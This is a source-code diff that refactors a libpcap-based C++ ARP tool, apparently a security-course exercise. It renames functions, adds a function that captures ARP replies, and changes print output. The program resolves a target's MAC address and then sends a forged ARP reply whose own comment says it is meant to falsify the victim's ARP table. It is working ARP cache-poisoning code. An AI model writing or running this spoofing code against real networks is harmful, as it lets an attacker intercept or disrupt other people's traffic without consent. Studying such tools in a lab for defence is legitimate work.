@@ -1,6 +1,6 @@
 #include "main.h"
 
-void send_arp(int mode, pcap_t *handle, Mac ether_dmac, Mac ether_smac, 
+void sendArp(int mode, pcap_t *handle, Mac ether_dmac, Mac ether_smac, 
 			 Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip)
 {
 	EthArpPacket packet;
@@ -28,17 +28,14 @@ void send_arp(int mode, pcap_t *handle, Mac ether_dmac, Mac ether_smac,
 	}
 	else
 	{
-		printf("\n------------------------------\n");
+		printf("\n\n------------------------------\n");
 		printf("Arp packet sending succeeded!");
-		printf("\n------------------------------\n");
+		printf("\n------------------------------\n\n");
 	}
 }
 
-void getSenderMac(pcap_t* handle, Mac src_mac, Ip src_ip, char* dst_mac, Ip arp_tip)
+EthArpPacket* receiveArp(pcap_t* handle, Ip src_ip, Ip dst_ip)
 {
-	send_arp(ArpHdr::Request, handle, Mac("ff:ff:ff:ff:ff:ff"), Mac(src_mac),
-		 Mac(src_mac), Ip(src_ip), Mac("00:00:00:00:00:00"), Ip(arp_tip));
-
 	while (true)
 		{
 			struct pcap_pkthdr *header;
@@ -51,12 +48,24 @@ void getSenderMac(pcap_t* handle, Mac src_mac, Ip src_ip, char* dst_mac, Ip arp_
 			EthArpPacket *reply = (EthArpPacket *)reply_packet;
 
 			if (ntohs(reply->eth_.type_) == EthHdr::Arp && ntohs(reply->arp_.op_) == ArpHdr::Reply &&
-				reply->arp_.sip_ == Ip(htonl(arp_tip)) && reply->arp_.tip_ == Ip(htonl(src_ip)))
+				reply->arp_.sip_ == Ip(htonl(src_ip)) && reply->arp_.tip_ == Ip(htonl(dst_ip)))
 			{
-				strcpy(dst_mac, std::string(reply->arp_.smac_).c_str());
-				break;
+				printf("\n\n------------------------------\n");
+				printf("Arp Packet captured..\n");
+				printf("from %s...\n", std::string(src_ip).data());
+				printf("to %s...", std::string(dst_ip).data());
+				printf("\n------------------------------\n\n\n");
+				return reply;
 			}
 		}
+}
+
+void getSenderMac(pcap_t* handle, Mac src_mac, Ip src_ip, char* dst_mac, Ip arp_tip)
+{
+	sendArp(ArpHdr::Request, handle, Mac("ff:ff:ff:ff:ff:ff"), Mac(src_mac),
+		 Mac(src_mac), Ip(src_ip), Mac("00:00:00:00:00:00"), Ip(arp_tip));
+
+	strcpy(dst_mac,std::string(receiveArp(handle, Ip(arp_tip), Ip(src_ip))->arp_.smac_).c_str());
 }
 
 int main(int argc, char *argv[])
@@ -71,12 +80,12 @@ int main(int argc, char *argv[])
 	int iter;
 	for (iter = 2; iter <= argc-1; iter += 2)
 	{
-		printf("Get info..\n\n");
+		printf("Get host info..\n\n");
 		char *dev = argv[1];
 		const char *interfaceName = argv[1];
 		// Collecting info for ARP packet
 		unsigned char src_mac[6];
-		if (getMACAddress(interfaceName, src_mac) == 0)
+		if (getHostMac(interfaceName, src_mac) == 0)
 		{
 			printf("src MAC : %02X:%02X:%02X:%02X:%02X:%02X\n",
 					src_mac[0], src_mac[1], src_mac[2],
@@ -87,8 +96,8 @@ int main(int argc, char *argv[])
 			printf("Failed to get MAC Address.\n");
 		}
 
-		 char src_ip[INET_ADDRSTRLEN];
-		if (getIPAddress(interfaceName, src_ip) == 0)
+		char src_ip[INET_ADDRSTRLEN];
+		if (getHostIp(interfaceName, src_ip) == 0)
 		{
 			printf("src IP : %s\n",src_ip);
 		}
@@ -114,7 +123,7 @@ int main(int argc, char *argv[])
 		printf("dst IP : %s\n", argv[iter]);
 
 		// Send ARP Reply packet to falsify victim(sender)'s ARP table
-		send_arp(ArpHdr::Reply, handle, Mac(dst_mac), Mac(src_mac), Mac(src_mac), Ip(argv[iter+1]), Mac(dst_mac), Ip(argv[iter]));
+		sendArp(ArpHdr::Reply, handle, Mac(dst_mac), Mac(src_mac), Mac(src_mac), Ip(argv[iter+1]), Mac(dst_mac), Ip(argv[iter]));
 
 		pcap_close(handle);
 	}
